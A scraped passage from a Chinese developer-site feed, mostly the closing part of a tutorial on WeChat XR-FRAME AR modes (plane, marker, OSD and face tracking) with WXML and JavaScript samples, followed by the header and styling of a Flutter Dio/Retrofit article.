<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1e6c656362a944018f9a41c142218c43~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518814&amp;x-signature=ANW0ihjwaRNJUSSZ5gWVzJSMKdg%3D" alt="kapture2.gif" loading="lazy"/></p>
<h3 data-id="heading-16">AR 系统</h3>
<p>AR 能力，需要调用摄像头权限</p>
<p>微信开发者工具无法模拟，请使用真机预览模式</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ceb20cc936e545f9a36db2131be5a58f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518814&amp;x-signature=MThlCKXDduXR7Cc2DjbJOKsSyb0%3D" alt="9.png" loading="lazy"/></p>
<h4 data-id="heading-17">Plane 识别</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f6160ffe26441ae81b44dd5f3440457~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518814&amp;x-signature=jc006Lq7HE4ZdA%2Bm5Pa8PcxnUFg%3D" alt="123" loading="lazy"/></p>
<p>源码示例: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdeepred5%2Fxr-frame-tutorial%2Ftree%2Fmain%2Fcomponents%2Fdemo3%2Findex.wxml" target="_blank" title="https://github.com/deepred5/xr-frame-tutorial/tree/main/components/demo3/index.wxml" ref="nofollow noopener noreferrer">Plane 模式</a></p>
<p><strong>Plane 模式</strong>是 AR 中的平面检测与追踪功能</p>
<p>常见的交互流程：</p>
<ol>
<li>扫描阶段</li>
</ol>
<ul>
<li>用户移动手机摄像头</li>
<li>AR 系统分析画面，识别水平或垂直的平面</li>
<li>常见平面：地板、桌面、墙壁、床面等</li>
</ul>
<ol start="2">
<li>检测阶段</li>
</ol>
<ul>
<li>找到平面后，显示视觉指示器（视频中的蓝色圆环）</li>
<li>指示器跟随检测到的平面移动</li>
</ul>
<ol start="3">
<li>放置阶段</li>
</ol>
<ul>
<li>用户点击屏幕</li>
<li>虚拟物体被"放置"到现实世界的平面上</li>
</ul>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- AR system 系统开启 Plane 模式 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">xr-scene</span> <span class="hljs-attr">ar-system</span>=<span class="hljs-string">"modes:Plane"</span> <span class="hljs-attr">bind:ready</span>=<span class="hljs-string">"handleReady"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-assets</span> <span class="hljs-attr">bind:loaded</span>=<span class="hljs-string">"handleAssetsLoaded"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xr-asset-load</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"gltf"</span> <span class="hljs-attr">asset-id</span>=<span class="hljs-string">"anchor"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://mmbizwxaminiprogram-1258344707.cos.ap-guangzhou.myqcloud.com/xr-frame/demo/ar-plane-marker.glb"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xr-asset-load</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"gltf"</span> <span class="hljs-attr">asset-id</span>=<span class="hljs-string">"miku"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://mmbizwxaminiprogram-1258344707.cos.ap-guangzhou.myqcloud.com/xr-frame/demo/miku.glb"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xr-asset-load</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"texture"</span> <span class="hljs-attr">asset-id</span>=<span class="hljs-string">"deepred"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://avatars.githubusercontent.com/u/13102815"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xr-asset-material</span> <span class="hljs-attr">asset-id</span>=<span class="hljs-string">"mat"</span> <span class="hljs-attr">uniforms</span>=<span class="hljs-string">"u_baseColorMap: deepred"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">xr-assets</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-light</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"ambient"</span> <span class="hljs-attr">color</span>=<span class="hljs-string">"1 1 1"</span> <span class="hljs-attr">intensity</span>=<span class="hljs-string">"1"</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-light</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"directional"</span> <span class="hljs-attr">rotation</span>=<span class="hljs-string">"40 70 0"</span> <span class="hljs-attr">color</span>=<span class="hljs-string">"1 1 1"</span> <span class="hljs-attr">intensity</span>=<span class="hljs-string">"3"</span> <span class="hljs-attr">cast-shadow</span> /&gt;</span>
  <span class="hljs-comment">&lt;!-- AR 追踪器 对应也要开启 Plane 模式 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-ar-tracker</span> <span class="hljs-attr">mode</span>=<span class="hljs-string">"Plane"</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 找到平面后，显示视觉指示器 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xr-gltf</span> <span class="hljs-attr">model</span>=<span class="hljs-string">"anchor"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">xr-gltf</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">xr-ar-tracker</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- 首先隐藏虚拟物体 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-node</span> <span class="hljs-attr">node-id</span>=<span class="hljs-string">"setitem"</span> <span class="hljs-attr">visible</span>=<span class="hljs-string">"false"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xr-gltf</span> <span class="hljs-attr">model</span>=<span class="hljs-string">"miku"</span> <span class="hljs-attr">anim-autoplay</span> <span class="hljs-attr">scale</span>=<span class="hljs-string">"0.07 0.07 0.07"</span> <span class="hljs-attr">rotation</span>=<span class="hljs-string">"0 180 0"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xr-mesh</span> <span class="hljs-attr">node-id</span>=<span class="hljs-string">"plane"</span> <span class="hljs-attr">geometry</span>=<span class="hljs-string">"plane"</span> <span class="hljs-attr">material</span>=<span class="hljs-string">"mat"</span> <span class="hljs-attr">scale</span>=<span class="hljs-string">"0.3 0.3 0.3"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">xr-node</span>&gt;</span>
   <span class="hljs-comment">&lt;!-- camera 的 background 设置成 ar --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-camera</span> <span class="hljs-attr">clear-color</span>=<span class="hljs-string">"0.4 0.8 0.6 1"</span> <span class="hljs-attr">background</span>=<span class="hljs-string">"ar"</span> <span class="hljs-attr">is-ar-camera</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">xr-scene</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Component</span>({
  <span class="hljs-attr">methods</span>: {
    <span class="hljs-attr">handleAssetsLoaded</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">{ detail }</span>) {
      wx.<span class="hljs-title function_">showToast</span>({ <span class="hljs-attr">title</span>: <span class="hljs-string">'点击屏幕放置模型'</span> });
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">scene</span>.<span class="hljs-property">event</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'touchstart'</span>, <span class="hljs-function">() =&gt;</span> {
        <span class="hljs-comment">// 虚拟物体被"放置"到现实世界的平面</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">scene</span>.<span class="hljs-property">ar</span>.<span class="hljs-title function_">placeHere</span>(<span class="hljs-string">'setitem'</span>, <span class="hljs-literal">true</span>);
      });
    },
    <span class="hljs-attr">handleReady</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">{ detail }</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">scene</span> = detail.<span class="hljs-property">value</span>;
    },
  }
})
</code></pre>
<h4 data-id="heading-18">Marker 识别</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/14ffaf8f391e4cd28061271c5e381be7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518814&amp;x-signature=PyxGxGnPor3oXQXLi2RdHa6uDmk%3D" alt="123" loading="lazy"/></p>
<p>源码示例: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdeepred5%2Fxr-frame-tutorial%2Ftree%2Fmain%2Fcomponents%2Fdemo4%2Findex.wxml" target="_blank" title="https://github.com/deepred5/xr-frame-tutorial/tree/main/components/demo4/index.wxml" ref="nofollow noopener noreferrer">Marker 模式</a></p>
<p><strong>Marker 模式</strong>，能够识别预先设定的目标物体(定义为 Marker，包括2D平面物体和3D物体），进行视觉跟踪与定位，通过在目标物体周围渲染虚拟物体，从而实现AR功能。</p>
<p>模型与现实物体保持空间位置关系(即：3D 层级 效果)。</p>
<p>Marker 分类</p>
<ol>
<li>2D Marker，仅适用于平面类物体，用户上传一张平面物体的俯视图像作为目标物体，算法运行时识别该平面物品，并渲染出相关虚拟物体。2D Marker可以理解为特殊的 3D Marker。</li>
<li>3D Marker，相比于2D Marker，能够识别3D物体，不局限于平面物体，具有更广的使用范围，算法运行前，需要手动制作3D Marker的识别目标文件（.map文件），然后算法运行时载入该文件用于识别</li>
</ol>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">xr-scene</span> <span class="hljs-attr">ar-system</span>=<span class="hljs-string">"modes:Marker"</span> <span class="hljs-attr">bind:ready</span>=<span class="hljs-string">"handleReady"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-assets</span> <span class="hljs-attr">bind:loaded</span>=<span class="hljs-string">"handleAssetsLoaded"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xr-asset-load</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"video-texture"</span> <span class="hljs-attr">asset-id</span>=<span class="hljs-string">"hikari"</span> <span class="hljs-attr">options</span>=<span class="hljs-string">"loop:true"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://assets.xxxx.com/resources/cdn/20250925/1c85f5b5ecde29ea.mp4"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xr-asset-load</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"texture"</span> <span class="hljs-attr">asset-id</span>=<span class="hljs-string">"deepred2"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://assets.xxxx.com/resources/cdn/20250925/c737cf37d083d543.png"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xr-asset-material</span> <span class="hljs-attr">asset-id</span>=<span class="hljs-string">"mat"</span> <span class="hljs-attr">effect</span>=<span class="hljs-string">"simple"</span> <span class="hljs-attr">uniforms</span>=<span class="hljs-string">"u_baseColorMap: video-hikari"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xr-asset-material</span> <span class="hljs-attr">asset-id</span>=<span class="hljs-string">"mat3"</span> <span class="hljs-attr">effect</span>=<span class="hljs-string">"simple"</span> <span class="hljs-attr">uniforms</span>=<span class="hljs-string">"u_baseColorMap: deepred2"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">xr-assets</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-node</span> <span class="hljs-attr">wx:if</span>=<span class="hljs-string">"{{loaded}}"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xr-ar-tracker</span> <span class="hljs-attr">mode</span>=<span class="hljs-string">"Marker"</span> <span class="hljs-attr">bind:ar-tracker-switch</span>=<span class="hljs-string">"handleTrackerSwitch"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://assets.xxxx.com/resources/cdn/20250925/fe8dad0e9800ef81.jpg"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">xr-mesh</span> <span class="hljs-attr">node-id</span>=<span class="hljs-string">"mesh-plane"</span> <span class="hljs-attr">geometry</span>=<span class="hljs-string">"plane"</span> <span class="hljs-attr">material</span>=<span class="hljs-string">"mat"</span> <span class="hljs-attr">scale</span>=<span class="hljs-string">"1.7778 1 1"</span> <span class="hljs-attr">position</span>=<span class="hljs-string">"0 0.1 0"</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">xr-mesh</span> <span class="hljs-attr">node-id</span>=<span class="hljs-string">"plane"</span> <span class="hljs-attr">geometry</span>=<span class="hljs-string">"plane"</span> <span class="hljs-attr">material</span>=<span class="hljs-string">"mat3"</span> <span class="hljs-attr">position</span>=<span class="hljs-string">"0.1 0.8 0.1"</span> <span class="hljs-attr">scale</span>=<span class="hljs-string">"0.12 0.12 0.12"</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">xr-ar-tracker</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">xr-node</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-camera</span> <span class="hljs-attr">clear-color</span>=<span class="hljs-string">"0.4 0.8 0.6 1"</span> <span class="hljs-attr">background</span>=<span class="hljs-string">"ar"</span> <span class="hljs-attr">is-ar-camera</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">xr-scene</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Component</span>({
  <span class="hljs-attr">methods</span>: {
    <span class="hljs-attr">handleReady</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">{ detail }</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">scene</span> = detail.<span class="hljs-property">value</span>;
    },
    <span class="hljs-attr">handleAssetsLoaded</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">{ detail }</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setData</span>({ <span class="hljs-attr">loaded</span>: <span class="hljs-literal">true</span> });
    },
    <span class="hljs-attr">handleTrackerSwitch</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">{ detail }</span>) {
      <span class="hljs-comment">// 获取追踪状态</span>
      <span class="hljs-keyword">const</span> active = detail.<span class="hljs-property">value</span>;
      <span class="hljs-keyword">const</span> video = <span class="hljs-variable language_">this</span>.<span class="hljs-property">scene</span>.<span class="hljs-property">assets</span>.<span class="hljs-title function_">getAsset</span>(<span class="hljs-string">'video-texture'</span>, <span class="hljs-string">'hikari'</span>);
      <span class="hljs-comment">// 识别到物体，播放视频</span>
      <span class="hljs-comment">// 识别中，暂停视频</span>
      active ? video.<span class="hljs-title function_">play</span>() : video.<span class="hljs-title function_">stop</span>();
    }
  }
})
</code></pre>
<h4 data-id="heading-19">OSD 识别</h4>
<p>源码示例: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdeepred5%2Fxr-frame-tutorial%2Ftree%2Fmain%2Fcomponents%2Fdemo5%2Findex.wxml" target="_blank" title="https://github.com/deepred5/xr-frame-tutorial/tree/main/components/demo5/index.wxml" ref="nofollow noopener noreferrer">OSD 模式</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/27bd28dd2952405fa4aade80d32839e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rex57qi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765518814&amp;x-signature=VC80mzGD80dVsOE9qi8Eq6b8bkw%3D" alt="123" loading="lazy"/></p>
<p><strong>OSD（One-shot Detection）Marker 识别模式</strong>，可以看成是一种特殊的 <code>Marker</code> 模式
：在摄像头画面上“贴图叠加”的模式，主要以 屏幕坐标系（2D） 为主，不真正感知<strong>空间深度</strong></p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">xr-scene</span> <span class="hljs-attr">ar-system</span>=<span class="hljs-string">"modes:OSD"</span> <span class="hljs-attr">bind:ready</span>=<span class="hljs-string">"handleReady"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-assets</span> <span class="hljs-attr">bind:loaded</span>=<span class="hljs-string">"handleAssetsLoaded"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xr-asset-material</span> <span class="hljs-attr">asset-id</span>=<span class="hljs-string">"mat"</span> <span class="hljs-attr">effect</span>=<span class="hljs-string">"simple"</span> <span class="hljs-attr">states</span>=<span class="hljs-string">"alphaMode:BLEND"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xr-asset-material</span> <span class="hljs-attr">asset-id</span>=<span class="hljs-string">"text-simple"</span> <span class="hljs-attr">effect</span>=<span class="hljs-string">"simple"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">xr-assets</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-node</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xr-ar-tracker</span> <span class="hljs-attr">mode</span>=<span class="hljs-string">"OSD"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://assets.xxxx.com/resources/cdn/20250925/fe8dad0e9800ef81.jpg"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">xr-node</span> <span class="hljs-attr">rotation</span>=<span class="hljs-string">"0 180 0"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">xr-mesh</span> <span class="hljs-attr">node-id</span>=<span class="hljs-string">"text-wrap"</span> <span class="hljs-attr">geometry</span>=<span class="hljs-string">"plane"</span> <span class="hljs-attr">material</span>=<span class="hljs-string">"mat"</span> <span class="hljs-attr">position</span>=<span class="hljs-string">"0 1 0"</span> <span class="hljs-attr">scale</span>=<span class="hljs-string">"1 1 0.5"</span> <span class="hljs-attr">rotation</span>=<span class="hljs-string">"90 0 0"</span> <span class="hljs-attr">uniforms</span>=<span class="hljs-string">"u_baseColorFactor:0.875 0.616 0.624 1"</span> /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">xr-text</span> <span class="hljs-attr">node-id</span>=<span class="hljs-string">"text-name"</span> <span class="hljs-attr">position</span>=<span class="hljs-string">"-0.25 1.05 0"</span> <span class="hljs-attr">scale</span>=<span class="hljs-string">"0.1 0.1 0.1"</span> <span class="hljs-attr">material</span>=<span class="hljs-string">"text-simple"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"美食家蜜蜂"</span> /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">xr-node</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">xr-ar-tracker</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">xr-node</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-camera</span> <span class="hljs-attr">clear-color</span>=<span class="hljs-string">"0.4 0.8 0.6 1"</span> <span class="hljs-attr">background</span>=<span class="hljs-string">"ar"</span> <span class="hljs-attr">is-ar-camera</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">xr-scene</span>&gt;</span>
</code></pre>
<h4 data-id="heading-20">人脸识别</h4>
<p>源码示例: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdeepred5%2Fxr-frame-tutorial%2Ftree%2Fmain%2Fcomponents%2Fdemo2%2Findex.wxml" target="_blank" title="https://github.com/deepred5/xr-frame-tutorial/tree/main/components/demo2/index.wxml" ref="nofollow noopener noreferrer">人脸识别</a></p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- AR system 系统开启 Face 模式 同时开启前置摄像头 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">xr-scene</span> <span class="hljs-attr">ar-system</span>=<span class="hljs-string">"modes:Face;camera:Front"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-assets</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xr-asset-load</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"gltf"</span> <span class="hljs-attr">asset-id</span>=<span class="hljs-string">"mask"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://mmbizwxaminiprogram-1258344707.cos.ap-guangzhou.myqcloud.com/xr-frame/demo/jokers_mask_persona5.glb"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">xr-assets</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- AR 追踪器 对应也要开启 Face 模式 --&gt;</span>
  <span class="hljs-comment">&lt;!-- auto-sync 是一个数字数组，用于将对应顺序的子节点绑定到某个特征点上 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-ar-tracker</span> <span class="hljs-attr">mode</span>=<span class="hljs-string">"Face"</span> <span class="hljs-attr">auto-sync</span>=<span class="hljs-string">"43"</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 包含识别成功后需要展示的场景 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">xr-gltf</span> <span class="hljs-attr">model</span>=<span class="hljs-string">"mask"</span> <span class="hljs-attr">rotation</span>=<span class="hljs-string">"0 180 0"</span> <span class="hljs-attr">scale</span>=<span class="hljs-string">"0.5 0.5 0.5"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">xr-ar-tracker</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-light</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"ambient"</span> <span class="hljs-attr">color</span>=<span class="hljs-string">"1 1 1"</span> <span class="hljs-attr">intensity</span>=<span class="hljs-string">"1"</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-light</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"directional"</span> <span class="hljs-attr">rotation</span>=<span class="hljs-string">"40 70 0"</span> <span class="hljs-attr">color</span>=<span class="hljs-string">"1 1 1"</span> <span class="hljs-attr">intensity</span>=<span class="hljs-string">"3"</span> /&gt;</span>
  <span class="hljs-comment">&lt;!-- AR 相机 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">xr-camera</span> <span class="hljs-attr">background</span>=<span class="hljs-string">"ar"</span> <span class="hljs-attr">is-ar-camera</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">xr-scene</span>&gt;</span>
</code></pre>
<p>除了人脸识别（Face），还有 人体识别（Body），人手识别（Hand），可以参考<a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.weixin.qq.com%2Fminiprogram%2Fdev%2Fcomponent%2Fxr-frame%2Far%2Ftracker.html%23Body" target="_blank" title="https://developers.weixin.qq.com/miniprogram/dev/component/xr-frame/ar/tracker.html#Body" ref="nofollow noopener noreferrer">官方文档学习</a></p>
<h2 data-id="heading-21">总结</h2>
<p>到这里，我们已经把 XR-FRAME 的基础能力都过了一遍：从创建场景、添加物体、设置光照，到加载模型和动画，再到四种 AR 识别模式（Plane、Marker、OSD、Face）。理论上，你已经可以做出一个简单的 AR 效果了。</p>
<p>但理论和实际总是有差距的。在下一篇<strong>实战篇</strong>中，我会分享更高阶的知识点和实际项目中的经验：</p>
<ul>
<li><strong>Shader 着色器</strong>：实现自定义视觉效果，让 AR 场景更炫酷</li>
<li><strong>同层渲染</strong>：XR 组件和小程序原生组件互相通信，实现复杂的 UI 交互</li>
<li><strong>企业级方案</strong>：性能优化、状态管理、多设备兼容等实战经验</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Flutter: Dio + Retrofit 入门（面向 Android 开发者）]]></title>    <link>https://juejin.cn/post/7579921879973429294</link>    <guid>https://juejin.cn/post/7579921879973429294</guid>    <pubDate>2025-12-05T06:00:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579921879973429294" data-draft-id="7579567346390695962" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Flutter: Dio + Retrofit 入门（面向 Android 开发者）"/> <meta itemprop="keywords" content="Flutter"/> <meta itemprop="datePublished" content="2025-12-05T06:00:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="renxhui"/> <meta itemprop="url" content="https://juejin.cn/user/1292681403181944"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Flutter: Dio + Retrofit 入门（面向 Android 开发者）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1292681403181944/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    renxhui
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T06:00:34.000Z" title="Fri Dec 05 2025 06:00:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 